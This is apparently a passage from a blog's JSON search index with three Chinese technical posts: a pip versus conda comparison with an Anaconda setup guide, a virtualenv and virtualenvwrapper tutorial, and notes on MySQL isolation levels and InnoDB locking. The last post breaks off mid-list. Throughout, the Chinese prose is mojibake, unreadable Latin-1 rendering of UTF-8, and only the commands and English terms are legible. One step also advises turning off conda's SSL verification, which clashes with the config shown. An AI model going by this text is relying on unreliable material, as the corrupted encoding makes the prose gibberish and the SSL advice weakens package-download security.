åœ¨å…±äº«ä¸»æœºæ—¶ï¼Œæ— æ³•åœ¨å…¨å±€site-packagesç›®å½•ä¸­å®‰è£…åŒ…ã€‚\n\nvirtualenvå°†ä¼šä¸ºå®ƒè‡ªå·±çš„å®‰è£…ç›®å½•åˆ›å»ºä¸€ä¸ªç¯å¢ƒï¼Œè¿™å¹¶ä¸ä¸å…¶ä»–virtualenvç¯å¢ƒå…±äº«åº“ï¼›åŒæ—¶ä¹Ÿå¯ä»¥é€‰æ‹©æ€§åœ°ä¸è¿æ¥å·²å®‰è£…çš„å…¨å±€åº“ã€‚\n\n\n\n### 2. pip ä¸ conda æ¯”è¾ƒ\n\n1. ä¾èµ–é¡¹æ£€æŸ¥\n\n   pipï¼š1. ä¸ä¸€å®šä¼šå±•ç¤ºæ‰€éœ€å…¶ä»–ä¾èµ–åŒ…ã€‚2. å®‰è£…åŒ…æ—¶æˆ–è®¸ä¼šç›´æ¥å¿½ç•¥ä¾èµ–é¡¹è€Œå®‰è£…ï¼Œä»…åœ¨ç»“æœä¸­æç¤ºé”™è¯¯ã€‚\n\n   condaï¼š1. åˆ—å‡ºæ‰€éœ€å…¶ä»–ä¾èµ–åŒ…ã€‚2. å®‰è£…åŒ…æ—¶è‡ªåŠ¨å®‰è£…å…¶ä¾èµ–é¡¹ã€‚3. å¯ä»¥ä¾¿æ·åœ°åœ¨åŒ…çš„ä¸åŒç‰ˆæœ¬ä¸­è‡ªç”±åˆ‡æ¢ã€‚\n\n   \n\n2. ç¯å¢ƒç®¡ç†\n\n   pipï¼šç»´æŠ¤å¤šä¸ªç¯å¢ƒéš¾åº¦è¾ƒå¤§ã€‚\n   condaï¼šæ¯”è¾ƒæ–¹ä¾¿åœ°åœ¨ä¸åŒç¯å¢ƒä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼Œç¯å¢ƒç®¡ç†è¾ƒä¸ºç®€å•ã€‚\n\n  \n\n3. å¯¹ç³»ç»Ÿè‡ªå¸¦Pythonçš„å½±å“\n\n   pipï¼šåœ¨ç³»ç»Ÿè‡ªå¸¦çš„PythonåŒ…ä¸­ æ›´æ–°/å›é€€ç‰ˆæœ¬/å¸è½½ å°†å½±å“å…¶ä»–ç¨‹åºã€‚\n   condaï¼šä¸ä¼šå½±å“ç³»ç»Ÿè‡ªå¸¦Pythonã€‚\n\n  \n\n4. é€‚ç”¨è¯­è¨€\n\n   pipï¼šä»…é€‚ç”¨äºPythonã€‚\n   condaï¼šé€‚ç”¨äºPython, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRANã€‚\n\n\n\n### 3. condaä¸pipã€virtualenvçš„å…³ç³»\n\ncondaç»“åˆäº†pipå’Œvirtualenvçš„åŠŸèƒ½ã€‚\n\n\n\n### 4. anacondaçš„å®‰è£…å’Œä½¿ç”¨\n\n\n\n**1. ä¸‹è½½å®‰è£…anaconda**  \n\nä¸‹è½½é“¾æ¥: https://www.anaconda.com/distribution/#download-section\n\nå‚»ç“œå®‰è£…å, anacondaä¼šæŠŠç³»ç»ŸPathä¸­çš„pythonæŒ‡å‘è‡ªå·±è‡ªå¸¦çš„Pythonï¼Œå¹¶ä¸”Anacondaå®‰è£…çš„ç¬¬ä¸‰æ–¹æ¨¡å—ä¼šå®‰è£…åœ¨Anacondaè‡ªå·±çš„è·¯å¾„ä¸‹ï¼Œä¸å½±å“ç³»ç»Ÿå·²å®‰è£…çš„Pythonç›®å½•ã€‚\n\n```shell\nwhich python3\n/Users/liuwei/anaconda3/bin/python3\n```\n\nå®‰è£…æˆåŠŸååœ¨åº”ç”¨ç¨‹åºé‡Œæ‰“å¼€ `Anaconda Navigator`ï¼Œä¼šå±•ç¤ºå‡ºå·²ç»å®‰è£…å¥½çš„å…¶ä»–å¸¸ç”¨åº”ç”¨ï¼Œå¦‚ï¼š\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/1.png)\n\n+ Anaconda Navigtor ï¼šç”¨äºç®¡ç†å·¥å…·åŒ…å’Œç¯å¢ƒçš„å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼Œåç»­æ¶‰åŠçš„ä¼—å¤šç®¡ç†å‘½ä»¤ä¹Ÿå¯ä»¥åœ¨ Navigator ä¸­æ‰‹å·¥å®ç°ã€‚\n\n+ Jupyter notebook ï¼šåŸºäºwebçš„äº¤äº’å¼è®¡ç®—ç¯å¢ƒï¼Œå¯ä»¥ç¼–è¾‘æ˜“äºäººä»¬é˜…è¯»çš„æ–‡æ¡£ï¼Œç”¨äºå±•ç¤ºæ•°æ®åˆ†æçš„è¿‡ç¨‹ã€‚\n\n+ qtconsole ï¼šä¸€ä¸ªå¯æ‰§è¡Œ IPython çš„ä»¿ç»ˆç«¯å›¾å½¢ç•Œé¢ç¨‹åºï¼Œç›¸æ¯” Python Shell ç•Œé¢ï¼Œqtconsole å¯ä»¥ç›´æ¥æ˜¾ç¤ºä»£ç ç”Ÿæˆçš„å›¾å½¢ï¼Œå®ç°å¤šè¡Œä»£ç è¾“å…¥æ‰§è¡Œï¼Œä»¥åŠå†…ç½®è®¸å¤šæœ‰ç”¨çš„åŠŸèƒ½å’Œå‡½æ•°ã€‚\n\n+ spyder ï¼šä¸€ä¸ªä½¿ç”¨Pythonè¯­è¨€ã€è·¨å¹³å°çš„ã€ç§‘å­¦è¿ç®—é›†æˆå¼€å‘ç¯å¢ƒã€‚\n\n\n\n**2. å®‰è£…ååœ¨ç»ˆç«¯è¾“å…¥conda æ— æ³•è¯†åˆ«è¿™ä¸ªå‘½ä»¤:**\n\n```shell\nexport PATH=\"${HOME}/anaconda3/bin:$PATH\"\n```\n\n\n\n**3. ä¿®æ”¹condaé•œåƒæº:**\n\nå¦‚ä¸ä¿®æ”¹condaçš„é•œåƒæºï¼Œ99.99%ä¼šæŠ¥httpé“¾æ¥å¤±è´¥çš„é”™è¯¯ï¼ˆç½‘å‹è¸©å‘ç»éªŒï¼‰ã€‚\n\nè¾“å…¥ä»¥ä¸‹ä¸¤æ¡å‘½ä»¤æ¥æ·»åŠ æ¸…åæºï¼š\n\n```shell\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ \nconda config --set show_channel_urls yes\n```\n\nåœ¨å®¶ç›®å½•ä¸‹ä¼šç”Ÿæˆ`.condarc`æ–‡ä»¶, ç„¶åæŠŠssl_verfiyæ”¹ä¸ºfalse,\n\n```\nssl_verify: true\nchannels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n  - defaults\nshow_channel_urls: true\n```\n\n\n\nç„¶åç”¨ conda info æŸ¥çœ‹å½“å‰é…ç½®ä¿¡æ¯ï¼Œchannel URLs å­—æ®µå†…å®¹å˜ä¸ºæ¸…åå³ä¿®æ”¹æˆåŠŸã€‚\n\n\n\n### 5. anaconda pythonç¯å¢ƒçš„åˆ›å»ºå’Œåˆ‡æ¢\n\n+ å¯ä»¥åœ¨`anaconda-navigator`åˆ›å»ºæ–°çš„ç¯å¢ƒ\n\n  ![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/2.png)\n\n\n\n ä¹Ÿå¯ä»¥å‘½ä»¤è¡Œåˆ›å»º:\n\n```shell\nconda create -n py27 python=2.7 æˆ– conda create --name py27 python=2.7\n```\n\n\n\n+ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹å½“å‰æœ‰å“ªäº›ç¯å¢ƒï¼š\n\n```shell\nconda info -e\n\nWARNING: The conda.compat module is deprecated and will be removed in a future release.\n\n# conda environments:\n#\nbase                  *  /Users/liuwei/anaconda3\npy27                     /Users/liuwei/anaconda3/envs/py27\n```\n\næ˜Ÿå·è¡¨ç¤ºå½“å‰æ¿€æ´»çš„ç¯å¢ƒã€‚\n\n\n\n+ æ¿€æ´»py27ç¯å¢ƒï¼š\n\n```shell\nsource activate py27 \næˆ– \nconda activate py27\n```\n\n\n\nè¿™æ—¶å€™çœ‹python, å·²ç»é“¾æ¥åˆ°py27äº†\n\n```shell\nwhich python\n\n/Users/liuwei/anaconda3/envs/py27/bin/python\n```\n\n\n\n+ é€€å‡ºå½“å‰ç¯å¢ƒ\n\n```shell\nconda deactivate \næˆ– \nsource deactivate\n```\n\n\n\n+ æŸ¥çœ‹å®‰è£…äº†å“ªäº›åŒ…\n\n```shell\nconda list\n```\n\n ä»¥åå¯ä»¥é€šè¿‡`anaconda-navigator`åœ¨æŒ‡å®šç¯å¢ƒä¸‹å®‰è£…åŒ…\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/4.png)\n\n\n\n### 6. é…ç½®pycharmä½¿ç”¨anacondaç¯å¢ƒ\n\nåœ¨`Project Interpreter` å¢åŠ  virtualenvsçš„ç‰¹å®šç¯å¢ƒä¸‹çš„æ‰§è¡Œç¨‹åº\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/3.png)\n\n\n\n\n\n### 7. å¸¸ç”¨å‘½ä»¤æ€»ç»“\n\n```bash\nconda info -e  # æŸ¥çœ‹æœ‰å“ªäº›ç¯å¢ƒ\nconda create --name py27 python=2.7 # åˆ›å»ºä¸€ä¸ªç¯å¢ƒ\nconda env remove --name py37 # åˆ é™¤ä¸€ä¸ªç¯å¢ƒ\nconda activate py27 # æ¿€æ´»æŸä¸ªç¯å¢ƒ\nconda deactivate  #é€€å‡ºå½“å‰ç¯å¢ƒ\nconda list # æŸ¥çœ‹å®‰è£…äº†å“ªäº›åŒ…\n\n# conda é‡Œé›†æˆ pip, ä»¥é˜² conda æ²¡æœ‰çš„åŒ…, é€šè¿‡ pip æ¥å®‰è£…\nconda install pip\n\nwhich pip\n/Users/liuwei/anaconda3/bin/pip\n\npip install xxx\n```\n\n","tags":["virtualenv"],"categories":["python"]},{"title":"pythonéš”ç¦»ç¯å¢ƒvirtualenvå’Œvirtualenvwrapperçš„ä½¿ç”¨","url":"%2Fp%2F8731aeb9.html","content":"\n\n\nå¦‚æœæˆ‘ä»¬è¦åŒæ—¶å¼€å‘å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£è¿™äº›åº”ç”¨ç¨‹åºéƒ½ä¼šå…±ç”¨ä¸€ä¸ªPythonï¼Œå°±æ˜¯å®‰è£…åœ¨ç³»ç»Ÿçš„Python 3ã€‚å¦‚æœåº”ç”¨Aéœ€è¦jinja 2.7ï¼Œè€Œåº”ç”¨Béœ€è¦jinja 2.6æ€ä¹ˆåŠï¼Ÿ\n\nè¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåº”ç”¨å¯èƒ½éœ€è¦å„è‡ªæ‹¥æœ‰ä¸€å¥—â€œç‹¬ç«‹â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚virtualenvå°±æ˜¯ç”¨æ¥ä¸ºä¸€ä¸ªåº”ç”¨åˆ›å»ºä¸€å¥—â€œéš”ç¦»â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚\n\n\n\n### 1. å®‰è£…ä½¿ç”¨virtualenv(æ¨èä½¿ç”¨virtualenvwrapper)\n\né¦–å…ˆï¼Œæˆ‘ä»¬ç”¨pipå®‰è£…virtualenvï¼š\n\n```shell\nsudo pip3 install virtualenv\n```\n\nç„¶åï¼Œå‡å®šæˆ‘ä»¬è¦å¼€å‘ä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼Œéœ€è¦ä¸€å¥—ç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œå¯ä»¥è¿™ä¹ˆåšï¼š\n\n\n\n<!-- more -->\n\n+ ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºç›®å½•ï¼š\n\n```shell\nmkdir myproject\ncd myproject/\n```\n\n\n\n+ ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œå‘½åä¸ºvenvï¼š\n\n```shell\nvirtualenv --no-site-packages venv\n\nvirtualenv -p /Library/Frameworks/Python.framework/Versions/3.7/bin/python3 --no-site-packages venv  # æŒ‡å®šç‰¹å®šçš„ç‰ˆæœ¬åˆ›å»ºéš”ç¦»ç¯å¢ƒ\n```\n\n\n\nå‘½ä»¤virtualenvå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œæˆ‘ä»¬è¿˜åŠ ä¸Šäº†å‚æ•°--no-site-packagesï¼Œè¿™æ ·ï¼Œå·²ç»å®‰è£…åˆ°ç³»ç»ŸPythonç¯å¢ƒä¸­çš„æ‰€æœ‰ç¬¬ä¸‰æ–¹åŒ…éƒ½ä¸ä¼šå¤åˆ¶è¿‡æ¥ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªä¸å¸¦ä»»ä½•ç¬¬ä¸‰æ–¹åŒ…çš„â€œå¹²å‡€â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚\n\n\n\n+ ç¬¬ä¸‰æ­¥, æ–°å»ºçš„Pythonç¯å¢ƒè¢«æ”¾åˆ°å½“å‰ç›®å½•ä¸‹çš„venvç›®å½•ã€‚æœ‰äº†venvè¿™ä¸ªPythonç¯å¢ƒï¼Œå¯ä»¥ç”¨sourceè¿›å…¥è¯¥ç¯å¢ƒï¼š\n\n```shell\nsource venv/bin/activate\næˆ–\n. venv/bin/activate\n```\n\næ³¨æ„åˆ°å‘½ä»¤æç¤ºç¬¦å˜äº†ï¼Œæœ‰ä¸ª(venv)å‰ç¼€ï¼Œè¡¨ç¤ºå½“å‰ç¯å¢ƒæ˜¯ä¸€ä¸ªåä¸ºvenvçš„Pythonç¯å¢ƒã€‚ \n\nï¼ˆmac iterm2+zshä¸‹ä¼šå‡ºç°èŸ’è›‡å“¦, å³pythonçš„logoï¼‰\n\n\n\nåœ¨venvç¯å¢ƒä¸‹ï¼Œç”¨pipå®‰è£…çš„åŒ…éƒ½è¢«å®‰è£…åˆ°venvè¿™ä¸ªç¯å¢ƒä¸‹ï¼Œç³»ç»ŸPythonç¯å¢ƒä¸å—ä»»ä½•å½±å“ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œvenvç¯å¢ƒæ˜¯ä¸“é—¨é’ˆå¯¹myprojectè¿™ä¸ªåº”ç”¨åˆ›å»ºçš„ã€‚\n\n\n\n+ ç¬¬å››æ­¥, é€€å‡ºå½“å‰çš„venvç¯å¢ƒï¼Œä½¿ç”¨deactivateå‘½ä»¤ï¼š\n\n```shell\ndeactivate\n```\n\næ­¤æ—¶å°±å›åˆ°äº†æ­£å¸¸çš„ç¯å¢ƒï¼Œç°åœ¨pipæˆ–pythonå‡æ˜¯åœ¨ç³»ç»ŸPythonç¯å¢ƒä¸‹æ‰§è¡Œã€‚\n\nå®Œå…¨å¯ä»¥é’ˆå¯¹æ¯ä¸ªåº”ç”¨åˆ›å»ºç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œè¿™æ ·å°±å¯ä»¥å¯¹æ¯ä¸ªåº”ç”¨çš„Pythonç¯å¢ƒè¿›è¡Œéš”ç¦»ã€‚\n\n\n\nvirtualenvæ˜¯å¦‚ä½•åˆ›å»ºâ€œç‹¬ç«‹â€çš„Pythonè¿è¡Œç¯å¢ƒçš„å‘¢ï¼ŸåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠç³»ç»ŸPythonå¤åˆ¶ä¸€ä»½åˆ°virtualenvçš„ç¯å¢ƒï¼Œç”¨å‘½ä»¤`source venv/bin/activate`è¿›å…¥ä¸€ä¸ªvirtualenvç¯å¢ƒæ—¶ï¼Œvirtualenvä¼šä¿®æ”¹ç›¸å…³ç¯å¢ƒå˜é‡ï¼Œè®©å‘½ä»¤pythonå’Œpipå‡æŒ‡å‘å½“å‰çš„virtualenvç¯å¢ƒã€‚\n\nvirtualenvä¸ºåº”ç”¨æä¾›äº†éš”ç¦»çš„Pythonè¿è¡Œç¯å¢ƒï¼Œè§£å†³äº†ä¸åŒåº”ç”¨é—´å¤šç‰ˆæœ¬çš„å†²çªé—®é¢˜ã€‚\n\n\n\n\n\n### 2. å®‰è£…virtualenvwrapper\n\nvirtualenvéœ€è¦æ¯æ¬¡ä½¿ç”¨sourceå‘½ä»¤å¯¼å…¥è™šæ‹Ÿæœºè¿è¡Œç¯å¢ƒï¼Œè¿™ä¸€ç‚¹éå¸¸éº»çƒ¦ï¼Œå¦å¤–å¼€å‘è€…è¿˜æœ‰å¯èƒ½å¿˜è®°è™šæ‹Ÿç¯å¢ƒç›®å½•çš„å»ºç«‹ä½ç½®ï¼Œvirtualenvwrapperè¿™ä¸€å‘½ä»¤è¡Œå·¥å…·å°±æ˜¯é€šè¿‡å¯¹virtualenvè¿›è¡Œå°è£…ï¼Œè§£å†³äº†ä¸Šè¿°é—®é¢˜\n\n\n\né¦–å…ˆæ˜¯å®‰è£…:\n\n```shell\nsudo pip3 isntall virtualenvwrapper\n```\n\n\n\nå®‰è£…åæŸ¥æ‰¾virtualenvwrapper.sh:\n\n```shell\nwhich virtualenvwrapper.sh \n\n/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh\n```\n\n\n\nç„¶åä¿®æ”¹ç¯å¢ƒå˜é‡é…ç½® `.zshrc`:\n\n```shell\nexport WORKON_HOME=$HOME/virtualenvs \n\nexport VIRTUALENVWRAPPER_SCRIPT=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n\nexport VIRTUALENVWRAPPER_PYTHON=/Library/Frameworks/Python.framework/Versions/3.7/bin/python3 \n\nexport VIRTUALENVWRAPPER_VIRTUALENV=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenv \n\nexport VIRTUALENVWRAPPER_VIRTUALENV_ARGS='--no-site-packages' \n\nsource /Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n```\n\n\n\nä¸­é—´çš„4è¡Œå’Œä½ æœ¬æœºçš„pythonç‰ˆæœ¬å’Œè·¯å¾„è¦ä¿æŒä¸€è‡´ï¼Œæ­¤å¤„æ³¨æ„å¦‚æœä¸åŠ ä¸Šé¢ä¸­é—´4è¡Œï¼Œåˆ™ä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼š\n\n```shell\n/usr/bin/python: No module named virtualenvwrapper\n```\n\nè‡³æ­¤å¤§åŠŸå‘Šæˆï¼Œå¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨virtualenvwrapperäº†ã€‚\n\n\n\n\n\n### 3. ä½¿ç”¨virtualenvwrapper\n\n\n\nåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ:\n\n```shell\nmkvirtualenv newenv  \n```\n\n\n\nè¿™æ ·å°±å»ºç«‹äº†ä¸€ä¸ªè™šæ‹Ÿçš„è¿è¡Œç¯å¢ƒï¼Œè€Œä¸”ä¸€å¼€å§‹å°±å¤„äºæ¿€æ´»çŠ¶æ€ï¼Œä½†çœ‹ä¸åˆ°newenvç›®å½•ï¼Œå…¶å®virtualenvwrapperå¯¹è™šæ‹Ÿæœºç¯å¢ƒä½œäº†ç»Ÿä¸€çš„ç®¡ç†ï¼Œæ ¹æ®ä¸Šé¢é…ç½®çš„ç¯å¢ƒå˜é‡WORK_HOMEçš„è·¯å¾„ä¿¡æ¯ï¼Œåœ¨å…¶ä¸­å»ºç«‹äº†è™šæ‹Ÿè¿è¡Œç¯å¢ƒç›®å½•.\n\n\n\nå…¶ä»–æœ‰ç”¨çš„å‘½ä»¤:\n\n- workon: æ‰“å°æ‰€æœ‰çš„è™šæ‹Ÿç¯å¢ƒï¼›\n- mkvirtualenv xxx: åˆ›å»º xxx è™šæ‹Ÿç¯å¢ƒ;\n- workon xxx: ä½¿ç”¨ xxx è™šæ‹Ÿç¯å¢ƒ;\n- deactivate: é€€å‡º xxx è™šæ‹Ÿç¯å¢ƒï¼›\n- rmvirtualenv xxx: åˆ é™¤ xxx è™šæ‹Ÿç¯å¢ƒã€‚\n\n\n\n\n\n### 4. é…ç½®pycharmä½¿ç”¨éš”ç¦»ç¯å¢ƒ\n\nåœ¨`Project Interpreter` å¢åŠ  virtualenvsçš„ç‰¹å®šç¯å¢ƒä¸‹çš„æ‰§è¡Œç¨‹åº\n\n![1](pythonéš”ç¦»ç¯å¢ƒvirtualenvå’Œvirtualenvwrapperçš„ä½¿ç”¨/1.png)","tags":["virtualenv"],"categories":["python"]},{"title":"mysqläº‹åŠ¡éš”ç¦»çº§åˆ«å’Œè¡¨é”è¡Œé”","url":"%2Fp%2F9762ea3e.html","content":"\n# 1. äº‹åŠ¡\n\n### 1.1 äº‹åŠ¡çš„å››å¤§ç‰¹æ€§\n\n+ åŸå­æ€§\n+ ä¸€è‡´æ€§\n+ éš”ç¦»æ€§\n+ æŒä¹…æ€§\n\nmysql é»˜è®¤æ˜¯å¼€å¯äº‹åŠ¡çš„, å› ä¸ºæœ‰é»˜è®¤æäº¤(autocommit=on).å°±æ˜¯æ™®é€šçš„ upddate ä¹Ÿæ˜¯ä¸€ä¸ªäº‹åŠ¡.\n\n<!-- more -->\n\n### 1.2 å¹¶å‘äº‹åŠ¡å¼•èµ·çš„é—®é¢˜\n\n+ è„è¯»\nå¦å¤–ä¸€ä¸ªäº‹åŠ¡æ²¡æäº¤ä½ å°±è¯»åˆ°\n\n+ ä¸å¯é‡å¤è¯»\nå¦å¤–ä¸€ä¸ªäº‹åŠ¡æäº¤åä½ å°±è¯»åˆ°,  update/delete\n\n+ å¹»è¯»\næ–°å¢äº†ä¸€ä¸ªæ•°æ®, ä½ è¯»åˆ°äº†     insert\n\n### 1.3 äº‹åŠ¡éš”ç¦»çº§åˆ«\n\n| ç±»å‹                         | å¤‡æ³¨                                                         |\n| ---------------------------- | ------------------------------------------------------------ |\n| Read Uncommitted(RU)æœªæäº¤è¯» | ä¸åŠ é”                                                       |\n| Read Committed(RC)å·²æäº¤è¯»   | è§£å†³è„è¯»                                                     |\n| Repeatable Read(RR)å¯é‡å¤è¯»  | è§£å†³è„è¯», ä¸å¯é‡å¤è¯», innodb è§£å†³äº†å¹»è¯»(å› ä¸ºé—´éš™é”ä¸è®©åˆ«äººæ’å…¥) |\n| Serializable(SE) ä¸²è¡ŒåŒ–      | selectéšå¼è½¬ä¸ºlock in share mode, ä¼šå’Œ update,delete äº’æ–¥  è§£å†³è„è¯», ä¸å¯é‡å¤è¯», å¹»è¯» |\n\n### 1.4 äº‹åŠ¡éš”ç¦»è§£å†³æ–¹æ¡ˆ\n\n+ è¯»å–æ•°æ®å‰, å¯¹å…¶åŠ é”, é˜»æ­¢å…¶ä»–äº‹åŠ¡ä¿®æ”¹  LBCC(Lock Based Concurrency Control)\n+ (å¸¸ç”¨)ç”Ÿæˆæ•°æ®è¯·æ±‚æ—¶é—´ç‚¹çš„ä¸€è‡´æ€§æ•°æ®å¿«ç…§, ç”¨å¿«ç…§æä¾›ä¸€å®šçº§åˆ«çš„ä¸€è‡´æ€§è¯»å– MVCC(Multi version Concurrency Control)   \n\n\n\n# 2. é”\n\nmyisam åªæ”¯æŒè¡¨é”, innodbæ”¯æŒè¡¨é”å’Œè¡Œé”.\n\n### 2.0 é¢„çƒ­\n\n+ æ™®é€šçš„ select è¯­å¥(æ²¡æœ‰åŠ é”åç¼€), innodb ä¸ä¼šåŠ é”, å°±ç®—åˆ«äººé”äº†, ä½ ä¹Ÿå¯ä»¥è¯»\n+ lock  in share mode è¯»é”, åªèƒ½è¯», å…¶ä»–äººä¸èƒ½æ”¹, è‡ªå·±ä¹Ÿä¸èƒ½æ”¹,  åˆ«äººå¯ä»¥å†åŠ ä¸ªè¯»é”, ä¸èƒ½å†åŠ å†™é”\n+ æ‰‹åŠ¨åŠ é”çš„è¯, commit/rollback é‡Šæ”¾é”\n+ delete/update/insert é»˜è®¤è‡ªåŠ¨åŠ å†™é”\n\n\n\n### 2.1 é”çš„æ¨¡å¼\n\n| é”                 | ç±»åˆ« | ä½¿ç”¨                                                      |\n| ------------------ | ---- | --------------------------------------------------------- |\n| å…±äº«é”(è¯»é”)(S é”) | è¡Œé” | select * from table where id = 1<br/>lock  in share mode; |\n| æ’å®ƒé”(å†™é”)(X é”) | è¡Œé” | select * from table where id = 1<br/>for update;          |\n| æ„å‘å…±äº«é”         | è¡¨é” | æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤,ç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œ                         |\n| æ„å‘æ’ä»–é”         | è¡¨é” | æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤,ç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œ                         |\n\nåŠ è¡¨é”çš„å‰æ:\n\n+ å…¨è¡¨æ‰«æ, ç¡®è®¤è¡¨é‡Œæ²¡æœ‰è¡Œ, è¢«å…¶ä»–äº‹åŠ¡åŠ é”, æ‰€ä»¥æ‰èƒ½æˆåŠŸåŠ è¡¨é”\n+ æ„å‘é”ç±»ä¼¼ä¸€ä¸ªæ ‡å¿—, èƒ½æé«˜åŠ  è¡¨é” çš„æ•ˆç‡\n\n\n\n### 2.2 è¡Œé”ç®—æ³• \n\nå‡è®¾æ•°æ®æ˜¯ 1, 4, 7, 10\n\n| ç®—æ³•                 | æè¿°                                            | ä½¿ç”¨                                                         | å¤‡æ³¨                         |\n| -------------------- | ----------------------------------------------- | :----------------------------------------------------------- | ---------------------------- |\n| Record Lockè®°å½•é”    | å”¯ä¸€ä¸»é”®, ç²¾å‡†åŒ¹é…                              | select * from t where id=4 for update; <br/>é”ä½ id=4        |                              |\n| Gap Locké—´éš™é”       | å®Œå…¨é¿è¿‡äº†ä¸»é”®è®°å½•, é”ä½æ•°æ®ä¸å­˜åœ¨çš„åŒºé—´        | select * from where id > 4 and id < 7 for update; <br/>é”ä½ (4-7) çš„åŒºé—´ (ä¸åŒ…æ‹¬4å’Œ7) | ä¸ºäº†ä¸è®©æ’å…¥                 |\n| Next-key Lock ä¸´é”®é” | = Record Lock + Gap Lock,åŒ…å«è®°å½•å’Œä¸å­˜åœ¨çš„åŒºé—´ | select * from where id > 5 and id < 9 for update;<br/>é”ä½ (4-7],  (7-10] çš„åŒºé—´ | åŒæ—¶åŒ…å«è®°å½•å’ŒåŒºé—´, ä¸¤ä¸ªéƒ½é” |\n\n\n\n### 2.3 é”åˆ°åº•é”ä½äº†ä»€ä¹ˆ\n\né”å…¶å®æ˜¯é”ä½äº†ç´¢å¼•\n\n+ å¦‚æœä¸ä½¿ç”¨ç´¢å¼•\nèµ°è¡¨é”\n\n\n+ ä½¿ç”¨äº†ç´¢å¼•\nèµ°è¡Œé”, é”ä½äº†æ˜¯ç´¢å¼•, ä¸æ˜¯é”ä½äº†ä¸€è¡Œ\n\n\n+ ä½†æ˜¯ä¸ºä»€ä¹ˆ2ä¸ªç´¢å¼•, é”äº†ä¸€ä¸ªç´¢å¼•, ç¬¬äºŒä¸ªç´¢å¼•ä¹Ÿè¢«é”äº†?\n\n  å› ä¸ºç´¢å¼•åˆ†ä¸ºä¸¤ç±»: \n\n  èšé›†ç´¢å¼•(ä¸»é”®/ Unique Not null/ _rowId å­—æ®µ )  å­˜å‚¨ç´¢å¼•å’Œæ•°æ®(B+æ ‘å¶å­èŠ‚ç‚¹)\n  äºŒçº§ç´¢å¼• å­˜å‚¨ç´¢å¼•å’Œä¸»é”®å€¼\n\n  æ‰€ä»¥å¯¹äºŒçº§ç´¢å¼•åŠ é”, ä¹Ÿä¼šå¯¼è‡´å¯¹ä¸»é”®åŠ é”, å› ä¸ºäºŒçº§ç´¢å¼•è¦æ ¹æ®ä¸»é”®å» B+æ ‘ å¶å­èŠ‚ç‚¹æ‰¾å€¼\n\n\n\n### 2.4 æ„å‘é”\n\nInnoDBæ”¯æŒå¤šç²’åº¦é”(multiple granularity locking)ï¼Œå®ƒå…è®¸è¡Œçº§é”ä¸è¡¨çº§é”å…±å­˜ï¼Œå®é™…åº”ç”¨ä¸­ï¼ŒInnoDBä½¿ç”¨çš„æ˜¯æ„å‘é”ã€‚\n\n+ é¦–å…ˆï¼Œæ„å‘é”ï¼Œæ˜¯ä¸€ä¸ªè¡¨çº§åˆ«çš„é”(table-level locking)ï¼›\n\n  \n\n+ æ„å‘é”åˆ†ä¸ºï¼š\n\n  + **æ„å‘å…±äº«é”**(intention shared lock, IS)ï¼Œå®ƒé¢„ç¤ºç€ï¼Œäº‹åŠ¡æœ‰æ„å‘å¯¹è¡¨ä¸­çš„æŸäº›è¡ŒåŠ å…±äº«Sé”\n\n  + **æ„å‘æ’å®ƒé”**(intention exclusive lock, IX)ï¼Œå®ƒé¢„ç¤ºç€ï¼Œäº‹åŠ¡æœ‰æ„å‘å¯¹è¡¨ä¸­çš„æŸäº›è¡ŒåŠ æ’å®ƒXé”\n\n  ä¸¾ä¸ªä¾‹å­ï¼š\n\n  select â€¦ lock in share modeï¼Œè¦è®¾ç½®**ISé”**ï¼›\n\n  select â€¦ for updateï¼Œè¦è®¾ç½®**IXé”**ï¼›\n\n  \n\n+ æ„å‘é”åè®®(intention locking protocol)å¹¶ä¸å¤æ‚ï¼š\n\n  + äº‹åŠ¡è¦è·å¾—æŸäº›è¡Œçš„Sé”ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ISé”\n\n  + äº‹åŠ¡è¦è·å¾—æŸäº›è¡Œçš„Xé”ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„IXé”\n\n\n\n+ 